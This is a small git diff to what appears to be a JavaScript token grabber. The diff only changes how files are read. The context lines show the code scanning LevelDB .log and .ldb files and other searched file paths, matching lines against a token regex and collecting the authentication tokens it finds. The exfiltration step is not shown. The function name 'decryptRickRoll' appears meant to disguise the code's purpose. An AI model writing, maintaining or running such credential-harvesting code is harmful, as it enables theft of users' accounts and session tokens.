@@ -38,7 +38,7 @@ const decryptRickRoll = (path) => {
     if (!existsSync(levelDB)) return;
     readdirSync(levelDB).map(async f => {
       if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
-      const lines = readFileSync(join(levelDB, f), { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
+      const lines = readFileSync(join(levelDB, f), 'utf8').split('\n').map(x => x.trim());
       lines.forEach(line => {
         line.match(tokenRegex)?.forEach(token => {
           if (!tokens.includes(token)) tokens.push({
@@ -132,7 +132,7 @@ module.exports = new Promise((resolve) => {
         search.split(/\r?\n/).forEach((filePath) => {
           filePath = filePath.trim();
           if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
-          const lines = readFileSync(filePath, { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
+          const lines = readFileSync(filePath, 'utf8').split('\n').map(x => x.trim());
           lines.forEach((line) => {
             const tokensMatch = line.match(tokenRegex);
             if (tokensMatch) {
